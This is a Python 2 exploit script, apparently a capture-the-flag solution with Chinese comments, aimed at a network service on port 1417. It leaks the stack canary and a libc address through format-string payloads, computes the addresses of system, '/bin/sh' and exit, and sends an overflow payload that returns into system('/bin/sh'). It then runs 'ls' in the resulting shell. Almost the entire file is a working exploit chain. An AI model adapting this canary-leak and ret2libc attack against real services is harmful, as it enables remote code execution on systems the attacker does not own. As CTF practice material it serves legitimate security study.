#!coding:utf-8
import socket
import time
from zio import *

st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#st.connect(('166.111.132.132', 1417))
st.connect(('10.10.10.133', 1417))

st.send("letmein\n")
time.sleep(.5)
print st.recv(1024)
#time.sleep(20)

#发送payload获取canary
payload = ""
payload += "%78$081x" + "A"*120

#print payload
st.send(payload)
time.sleep(.5)
data  = st.recv(1024)
canar_str = data[73:79]
#print canar_str
canar = int(canar_str, 16)
print "canar:" + hex(canar)


#发送payload获取__libc_start_main()真实地址
payload_libc = ""
payload_libc += "%82$081x" + "A"*120

#print payload_libc
st.send(payload_libc)
time.sleep(.5)
data_libc = st.recv(1024)
libc = int(data_libc[73:81], 16)
print "libc:" + hex(libc)


#计算system, binsh
#230(0xe6)
libc_addr = libc - 0xe6
print "libc_addr:" + hex(libc_addr)

base_addr = libc_addr - 0x16D60
print "base_addr:" + hex(base_addr)

system_addr = base_addr+0x3BF10
print "system_addr:" + hex(system_addr)

binsh_addr = base_addr+0x13BAD4
print "binsh_addr:" + hex(binsh_addr)

exit_addr = base_addr+0x2F550
print "exit_addr:" + hex(exit_addr)

#构造payload
# %0offsetd + canary + %0**d + ret(system bin/sh)

###########
#canar = 0x303132
#system_addr = 0x30313233
#binsh_addr = 0x34353637
#exit_addr = 0x36373839
###########
#print l32(canar)
#print l32(canar)[0:3]


payload_sys = ""
payload_sys += "%0256d" + "%2$c"
payload_sys += l32(canar)[0:3]
payload_sys += "A"*12
payload_sys += l32(system_addr) + l32(exit_addr) + l32(binsh_addr)
payload_sys += "A"*91
#print payload_sys

#####
#print payload
#print payload_libc
#print payload_sys
#####

st.send(payload_sys)
time.sleep(1)
print st.recv(2048)

st.send("n\n")
time.sleep(1)
#print st.recv(2048)

#st.send("cat flag\n")
st.send("ls\n")
time.sleep(.5)
print st.recv(4096)

#s = raw_input()
#st.send(s+'\n')
#while True:
#	s = st.recv(4096)
#	if len(s)==0:
#		break
#	sys.stdout.write(s)
#	sys.stdout.flush()
